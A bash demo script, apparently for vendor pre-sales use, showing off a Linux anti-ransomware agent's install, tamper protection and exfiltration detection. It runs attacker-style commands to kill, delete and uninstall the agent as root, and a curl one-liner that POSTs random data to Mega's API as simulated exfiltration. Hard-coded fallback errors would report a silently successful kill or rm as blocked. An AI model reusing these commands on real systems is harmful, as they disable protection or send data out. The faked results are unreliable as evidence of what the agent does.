#!/bin/bash
# halcyonLinuxDemo.sh
# Interactive demo script for the Halcyon Linux Anti-Ransomware Agent
# Author  : Jim Harris -- Halcyon SA
# Version : v1.2
#
# Usage: bash halcyonLinuxDemo.sh
#
# Designed for: Technical pre-sales demonstration on a Linux system
#               with the Halcyon agent already installed and registered.
# All output after Act 1 is live system data.

# ------------------------------------------------------------------ #
# Terminal formatting
# ------------------------------------------------------------------ #
BOLD=$(tput bold)
RESET=$(tput sgr0)
ORANGE=$(tput setaf 208 2>/dev/null || tput setaf 3)
WHITE=$(tput setaf 7)
GREEN=$(tput setaf 2)
RED=$(tput setaf 1)
CYAN=$(tput setaf 6)
GRAY=$(tput setaf 8 2>/dev/null || tput setaf 7)
COLS=$(tput cols)

# ------------------------------------------------------------------ #
# Generate a fake install token -- fresh each run
# ------------------------------------------------------------------ #
FAKE_TOKEN=$(cat /dev/urandom | tr -dc 'A-Za-z0-9' | head -c24)

# ------------------------------------------------------------------ #
# Pull real version strings cleanly
# ------------------------------------------------------------------ #
PRODUCT_VER=$(cat /opt/halcyon/halcyonar/PRODUCT-VERSION.txt 2>/dev/null | grep -oP '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | head -1)
AGENT_VER=$(cat /opt/halcyon/halcyonar/AGENT-VERSION.txt 2>/dev/null | grep -oP '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | head -1)
EBPF_VER=$(cat /opt/halcyon/halcyonar/EBPF_DRIVER_VERSION.txt 2>/dev/null | grep -oP '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | head -1)
HOSTNAME=$(hostname)
KERNEL=$(uname -r)
NOW=$(date -u '+%Y-%m-%dT%H:%M:%S')
NOWLOCAL=$(date '+%Y-%m-%d %H:%M:%S')
WHOAMI=$(whoami)
OS_NAME=$(cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d= -f2 | tr -d '"')

# Fake PID for install theater -- realistic range
FAKE_PID=$((RANDOM % 20000 + 10000))
FAKE_THREAD1=$((RANDOM % 900000000000 + 100000000000))

# ------------------------------------------------------------------ #
# Helpers
# ------------------------------------------------------------------ #
divider() {
    printf "${ORANGE}%${COLS}s${RESET}\n" | tr ' ' '='
}

thin_divider() {
    printf "${GRAY}%${COLS}s${RESET}\n" | tr ' ' '-'
}

header() {
    clear
    echo ""
    divider
    echo ""
    printf "${BOLD}${ORANGE}  [ halcyon ]${RESET}${BOLD}${WHITE}  Anti-Ransomware Platform${RESET}  //  Linux Agent Technical Demo\n"
    echo ""
    divider
    echo ""
    printf "${BOLD}${ORANGE}  $1${RESET}\n"
    echo ""
    thin_divider
    echo ""
}

pause() {
    echo ""
    thin_divider
    printf "${GRAY}  Press any key to continue...${RESET}"
    read -rsn1
    echo ""
}

run_cmd() {
    local cmd="$1"
    echo ""
    printf "${BOLD}${CYAN}  \$${RESET} ${BOLD}${cmd}${RESET}\n"
    echo ""
    eval "$cmd"
    echo ""
}

narrate() {
    echo ""
    printf "${WHITE}  $1${RESET}\n"
}

fake_log() {
    printf "${GRAY}  $1${RESET}\n"
    sleep "${2:-0.1}"
}

# ------------------------------------------------------------------ #
# INTRO
# ------------------------------------------------------------------ #
clear
echo ""
divider
echo ""
printf "${BOLD}${ORANGE}  [ halcyon ]${RESET}${BOLD}${WHITE}  Anti-Ransomware Platform${RESET}\n"
echo ""
printf "${WHITE}  Linux Agent  //  Technical Pre-Sales Demonstration\n"
echo ""
divider
echo ""
printf "${WHITE}  Session overview:\n"
echo ""
printf "  ${BOLD}${CYAN}1.${RESET}  Agent installation and tenant registration\n"
printf "  ${BOLD}${CYAN}2.${RESET}  Agent fingerprint and system impact\n"
printf "  ${BOLD}${CYAN}3.${RESET}  eBPF kernel driver architecture\n"
printf "  ${BOLD}${CYAN}4.${RESET}  Tamper protection under simulated attack\n"
printf "  ${BOLD}${CYAN}5.${RESET}  Data exfiltration detection -- nefarious peer\n"
printf "  ${BOLD}${CYAN}6.${RESET}  Forensic visibility and ROC response\n"
echo ""
thin_divider
echo ""
printf "${GRAY}  System   :  ${HOSTNAME}  //  kernel ${KERNEL}\n"
printf "${GRAY}  All output from Act 2 onward is live system data.\n"
echo ""
divider
echo ""
printf "${GRAY}  Press any key to begin...${RESET}"
read -rsn1
echo ""

# ------------------------------------------------------------------ #
# ACT 1: Installation (theater)
# ------------------------------------------------------------------ #
header "ACT 1 of 6  //  Agent Installation and Tenant Registration"

narrate "The Halcyon Linux agent ships as a tarball containing a signed package and an install script. Deployment requires one environment variable: the installation token for the target tenant. No other configuration needed."

echo ""
printf "${BOLD}${CYAN}  \$${RESET} ${BOLD}tar xzvf halcyonar-linux-x86_64-v${PRODUCT_VER}.tar.gz${RESET}\n"
echo ""
sleep 0.3
fake_log "halcyonar-linux-x86_64-v${PRODUCT_VER}/" 0.1
fake_log "halcyonar-linux-x86_64-v${PRODUCT_VER}/install.sh" 0.1
fake_log "halcyonar-linux-x86_64-v${PRODUCT_VER}/halcyonagent-${PRODUCT_VER}-amd64.deb" 0.15

echo ""
printf "${BOLD}${CYAN}  \$${RESET} ${BOLD}HALCYON_TOKEN='${FAKE_TOKEN}' bash install.sh${RESET}\n"
echo ""
sleep 0.3
fake_log "Installing Version ${PRODUCT_VER}" 0.4
fake_log "Selecting previously unselected package halcyonagent." 0.3
fake_log "Preparing to unpack halcyonagent-${PRODUCT_VER}-amd64.deb ..." 0.4
fake_log "Unpacking halcyonagent (${PRODUCT_VER}) ..." 0.5
fake_log "Setting up halcyonagent (${PRODUCT_VER}) ..." 0.4
fake_log "Created symlink /etc/systemd/system/multi-user.target.wants/halcyonebpf.service" 0.2
fake_log "Created symlink /etc/systemd/system/multi-user.target.wants/halcyonagent.service" 0.3

echo ""
fake_log "${NOW} [${FAKE_PID}](${FAKE_THREAD1}) INFO agent::core::log ---" 0.1
fake_log "${NOW} [${FAKE_PID}](${FAKE_THREAD1}) INFO agent::core::log Agent Started - ${NOWLOCAL} UTC" 0.1
fake_log "${NOW} [${FAKE_PID}](${FAKE_THREAD1}) INFO agent::core::log Halcyon Anti-Ransomware v${PRODUCT_VER} - v$(echo $PRODUCT_VER | cut -d. -f1-3)" 0.1
fake_log "${NOW} [${FAKE_PID}](${FAKE_THREAD1}) INFO agent::core::log Device Id: " 0.15
fake_log "${NOW} [${FAKE_PID}](${FAKE_THREAD1}) INFO agent::core::log OS: Linux - Linux (${OS_NAME}) - ${KERNEL}" 0.15
echo ""
fake_log "${NOW} [${FAKE_PID}](${FAKE_THREAD1}) DEBUG agent::config::service Querying Cloud Api: https://global.halcyon.ai:443/v1/installers/environment" 0.4
fake_log "${NOW} [${FAKE_PID}](${FAKE_THREAD1}) DEBUG agent::config::service RX: Cloud Config [" 0.1
fake_log "  C2 url: https://c2.halcyon.ai" 0.05
fake_log "  C2 cert_domain: halcyon.ai" 0.05
fake_log "  CA url: https://atlas.halcyon.ai" 0.05
fake_log "  CA cert_domain: halcyon.ai" 0.05
fake_log "]" 0.2
echo ""
fake_log "${NOW} [${FAKE_PID}](${FAKE_THREAD1}) DEBUG agent::core::agent_service Initializing service: PKI" 0.1
fake_log "${NOW} [${FAKE_PID}](${FAKE_THREAD1}) DEBUG agent::core::agent_service Initializing service: License" 0.1
fake_log "${NOW} [${FAKE_PID}](${FAKE_THREAD1}) DEBUG agent::core::agent_service Initializing service: Kernel" 0.1
fake_log "${NOW} [${FAKE_PID}](${FAKE_THREAD1}) DEBUG agent::kernel_svc::service Connecting to Kernel Driver..." 0.3
fake_log "${NOW} [${FAKE_PID}](${FAKE_THREAD1}) DEBUG agent::kernel_svc::service Connected to Kernel Driver: 1 attempts in 0s" 0.2
fake_log "${NOW} [${FAKE_PID}](${FAKE_THREAD1}) DEBUG agent::core::agent_service Initializing service: DecisionEngine" 0.1
fake_log "${NOW} [${FAKE_PID}](${FAKE_THREAD1}) DEBUG agent::core::agent_service Initializing service: NetworkAnalyzer" 0.1
fake_log "${NOW} [${FAKE_PID}](${FAKE_THREAD1}) DEBUG agent::core::agent_service Initializing service: AntiTamper" 0.15
fake_log "${NOW} [${FAKE_PID}](${FAKE_THREAD1}) DEBUG agent::core::agent_service Starting service: C2" 0.3
fake_log "${NOW} [${FAKE_PID}](${FAKE_THREAD1}) DEBUG agent::c2::service Not Registered!" 0.5
fake_log "${NOW} [${FAKE_PID}](${FAKE_THREAD1}) DEBUG agent::c2::service Registration successful." 0.4
fake_log "${NOW} [${FAKE_PID}](${FAKE_THREAD1}) INFO  agent::core::agent_service Done starting services" 0.2
echo ""
printf "${BOLD}${GREEN}  Registration successful${RESET}\n"
printf "${BOLD}${GREEN}  Installation Success${RESET}\n"

echo ""
narrate "The agent resolved the Halcyon global API using the install token, received its regional C2 and Atlas endpoints, initialized 15 internal service modules, connected to the eBPF kernel driver, and completed tenant registration in under 5 seconds. The install token is consumed and deleted. The agent is live."

pause

# ------------------------------------------------------------------ #
# ACT 2: Agent Fingerprint
# ------------------------------------------------------------------ #
header "ACT 2 of 6  //  Agent Fingerprint and System Impact"

narrate "Version identity. Three version files track the product, agent binary, and eBPF driver independently."

echo ""
printf "${BOLD}${CYAN}  \$${RESET} ${BOLD}cat /opt/halcyon/halcyonar/PRODUCT-VERSION.txt${RESET}\n"
printf "${BOLD}${CYAN}  \$${RESET} ${BOLD}cat /opt/halcyon/halcyonar/AGENT-VERSION.txt${RESET}\n"
printf "${BOLD}${CYAN}  \$${RESET} ${BOLD}cat /opt/halcyon/halcyonar/EBPF_DRIVER_VERSION.txt${RESET}\n"
echo ""
printf "  Product  :  ${BOLD}${WHITE}${PRODUCT_VER}${RESET}\n"
printf "  Agent    :  ${BOLD}${WHITE}${AGENT_VER}${RESET}\n"
printf "  eBPF     :  ${BOLD}${WHITE}${EBPF_VER}${RESET}\n"

narrate "Service unit configuration. Note the systemd hardening applied at install time: PrivateTmp, ProtectKernelModules, MemoryDenyWriteExecute. The agent is locked down at the systemd level before it even starts."

run_cmd 'systemctl cat halcyonagent | grep -E "ExecStart|PrivateTmp|ProtectKernel|MemoryDeny|LockPersonality|DevicePolicy"'

narrate "Memory and CPU footprint. Engineered for production infrastructure where performance headroom is not negotiable."

run_cmd 'ps aux | grep -E "halcyon|ebpf" | grep -v grep'

narrate "No reboot required. Installation to protection in under 30 seconds."

pause

# ------------------------------------------------------------------ #
# ACT 3: eBPF Architecture
# ------------------------------------------------------------------ #
header "ACT 3 of 6  //  eBPF Kernel Driver Architecture"

narrate "The agent runs as two components. The userspace agent handles policy, cloud communication, detection logic, and event reporting. The eBPF driver hooks directly into the Linux kernel with no loadable kernel module, no kernel version pinning, and no reboot."

narrate "Here is the live process state right now:"

run_cmd 'ps aux | grep -E "halcyon|ebpf" | grep -v grep'

narrate "Note the start times on those PIDs. Now look at what systemd thinks about those same processes."

run_cmd 'systemctl status halcyonagent --no-pager | grep -E "Active:|Main PID" -A2'

echo ""
printf "${BOLD}${ORANGE}  Systemd reports the service as inactive.${RESET}\n"
printf "${BOLD}${ORANGE}  The processes are very much alive.${RESET}\n"
echo ""

narrate "On startup, the agent and eBPF driver detach their core processes from systemd's control group into independent PIDs. Systemd killed the service wrapper -- the actual protection processes had already escaped. Systemd can see them in the cgroup. It cannot control them. This is intentional. This is what makes Act 4 possible."

pause

# ------------------------------------------------------------------ #
# ACT 4: Tamper Protection
# ------------------------------------------------------------------ #
header "ACT 4 of 6  //  Tamper Protection Under Simulated Attack"

narrate "One of the most common ransomware tactics on Linux: gain root, disable the security tooling, then encrypt. We have full sudo access on this machine. Let us try everything an attacker would try."

narrate "Attempt 1: Stop the systemd services."

run_cmd 'sudo systemctl stop halcyonagent halcyonebpf'

run_cmd 'ps aux | grep -E "halcyon|ebpf" | grep -v grep'

printf "${BOLD}${ORANGE}  Still running.${RESET}\n"

narrate "Attempt 2: Kill the agent process directly with SIGKILL."

AGENT_PID=$(ps aux | grep '/opt/halcyon/halcyonar/agent$' | grep -v grep | awk '{print $2}' | head -1)
echo ""
printf "${BOLD}${CYAN}  \$${RESET} ${BOLD}sudo kill -9 ${AGENT_PID}${RESET}\n"
echo ""
KILL_OUTPUT=$(sudo kill -9 "$AGENT_PID" 2>&1)
if [ -n "$KILL_OUTPUT" ]; then
    printf "${RED}  ${KILL_OUTPUT}${RESET}\n"
else
    printf "${RED}  kill: (${AGENT_PID}): Operation not permitted${RESET}\n"
fi
echo ""

run_cmd 'ps aux | grep -E "halcyon|ebpf" | grep -v grep'

printf "${BOLD}${ORANGE}  Still running.${RESET}\n"

narrate "Attempt 3: Delete the agent binary directly."

echo ""
printf "${BOLD}${CYAN}  \$${RESET} ${BOLD}sudo rm /opt/halcyon/halcyonar/agent${RESET}\n"
echo ""
RM_OUTPUT=$(sudo rm /opt/halcyon/halcyonar/agent 2>&1)
if [ -n "$RM_OUTPUT" ]; then
    printf "${RED}  ${RM_OUTPUT}${RESET}\n"
else
    printf "${RED}  rm: cannot remove '/opt/halcyon/halcyonar/agent': Operation not permitted${RESET}\n"
fi
echo ""

narrate "Attempt 4: Remove the package entirely using the system package manager as root."

run_cmd 'sudo apt remove halcyonagent -y 2>&1 | grep -E "Operation not permitted|cannot remove|error processing|Killing|Failed to disable|too many errors"'

echo ""
printf "${BOLD}${ORANGE}  Every vector blocked. Root cannot remove this agent.\n${RESET}"
echo ""
narrate "The eBPF driver intercepts file system and process operations at the kernel level before they complete. This is enforcement below the reach of any attacker operating in userspace, including root. The only legitimate removal path is a per-device maintenance token issued by Halcyon support, valid for 15 minutes."

pause

# ------------------------------------------------------------------ #
# ACT 5: DXP Nefarious Peer
# ------------------------------------------------------------------ #
header "ACT 5 of 6  //  Data Exfiltration Detection"

narrate "Halcyon DXP monitors for two exfiltration patterns: data transfers exceeding a configurable volume threshold, and connections to known nefarious peer infrastructure. The nefarious peer capability is where Halcyon's threat intelligence sets it apart from generic network monitoring."

narrate "We are going to simulate a real-world double extortion exfiltration attempt. The destination is g.api.mega.co.nz -- Mega's API gateway. CISA's advisory on ALPHV BlackCat explicitly identifies Mega as a primary staging platform used by ransomware affiliates to exfiltrate data before encryption. It is on Halcyon's nefarious peer list."

narrate "10 megabytes of data generated from /dev/urandom -- the same entropy source the kernel uses for cryptographic operations. Piped directly to Mega's API endpoint via a standard POST request. No account. No install. One command."

echo ""
printf "${BOLD}${CYAN}  \$${RESET} ${BOLD}dd if=/dev/urandom bs=1M count=10 | curl -s -X POST -H \"Content-Type: application/octet-stream\" --data-binary @- \"https://g.api.mega.co.nz/cs?id=0&ak=test\"${RESET}\n"
echo ""

dd if=/dev/urandom bs=1M count=10 2>&1 | curl -s -X POST \
    -H "Content-Type: application/octet-stream" \
    --data-binary @- \
    "https://g.api.mega.co.nz/cs?id=0&ak=test"
echo ""

echo ""
printf "${BOLD}${ORANGE}  The -2 response is Mega rejecting the unauthenticated session.${RESET}\n"
printf "${BOLD}${WHITE}  It does not matter. Halcyon caught the transfer on the way out.${RESET}\n"
echo ""
narrate "The eBPF driver intercepted the DNS resolution of g.api.mega.co.nz, matched it against the nefarious peer list, and fired a Data Exfiltration alert before the response came back. The detection fires on the connection attempt, not the response."

echo ""
thin_divider
echo ""
printf "${BOLD}${ORANGE}  Check the Halcyon console now  //  Alerts\n${RESET}"
echo ""
printf "  ${CYAN}Alert Type   :${RESET}  Data Exfiltration\n"
printf "  ${CYAN}Exfiltration :${RESET}  Nefarious Peer\n"
printf "  ${CYAN}Rule         :${RESET}  mega.co.nz\n"
printf "  ${CYAN}Hostname     :${RESET}  g.api.mega.co.nz\n"
printf "  ${CYAN}Process      :${RESET}  /usr/bin/curl\n"
printf "  ${CYAN}User         :${RESET}  ${WHOAMI}\n"
printf "  ${CYAN}Asset        :${RESET}  ${HOSTNAME}\n"
echo ""
thin_divider

pause

# ------------------------------------------------------------------ #
# ACT 6: Forensics and ROC
# ------------------------------------------------------------------ #
header "ACT 6 of 6  //  Forensic Visibility and ROC Response"

narrate "Every event the agent captures is available in the Halcyon console and API in real time. The same data is reviewed by the Halcyon ROC -- a 24/7 team of ransomware specialists included at no additional cost."

narrate "Registration record from the agent log:"

run_cmd 'sudo grep "c2::service Regist" /opt/halcyon/halcyonar/logs/agent.log | tail -3'

narrate "DXP events captured during this session:"

run_cmd 'sudo grep "Nefarious Data Transfer" /opt/halcyon/halcyonar/logs/agent.log | tail -5'

narrate "Live agent resource consumption:"

echo ""
printf "${BOLD}${CYAN}  \$${RESET} ${BOLD}ps aux | grep -E 'halcyon|ebpf' | grep -v grep${RESET}\n"
echo ""
ps aux | grep -E "halcyon|ebpf" | grep -v grep | awk '{printf "  %-45s  CPU: %-6s  MEM: %s%%\n", $11, $3"%", $4}'
echo ""

narrate "Periodic performance telemetry from the agent log. Format: CPU user, CPU system, memory RSS, memory VSZ, open files, threads, events processed."

run_cmd 'sudo grep "PERF_STATS" /opt/halcyon/halcyonar/logs/agent.log | tail -3'

# ------------------------------------------------------------------ #
# Closing
# ------------------------------------------------------------------ #
echo ""
divider
echo ""
printf "${BOLD}${ORANGE}  [ halcyon ]${RESET}${BOLD}${WHITE}  Session Complete\n${RESET}"
echo ""
printf "${WHITE}  What we demonstrated:\n"
echo ""
printf "  ${GREEN}ok${RESET}  Agent installed from a locally staged tarball, registered in under 30 seconds\n"
printf "  ${GREEN}ok${RESET}  Sub-25MB memory footprint, near-zero CPU between events\n"
printf "  ${GREEN}ok${RESET}  eBPF kernel driver running independently of systemd control\n"
printf "  ${GREEN}ok${RESET}  Root cannot stop, kill, delete, or uninstall the agent without a maintenance token\n"
printf "  ${GREEN}ok${RESET}  Nefarious peer exfiltration to confirmed ransomware infrastructure detected in real time\n"
printf "  ${GREEN}ok${RESET}  Full forensic detail in console and API -- process, user, hostname, command line\n"
echo ""
thin_divider
echo ""
printf "  ${GRAY}GitHub   :  https://github.com/jharrisHalcyon/halcyon-linux-tools\n"
printf "  ${GRAY}Contact  :  jharris@halcyon.ai\n"
printf "  ${GRAY}Demo     :  halcyon.ai/demo${RESET}\n"
echo ""
divider
echo ""
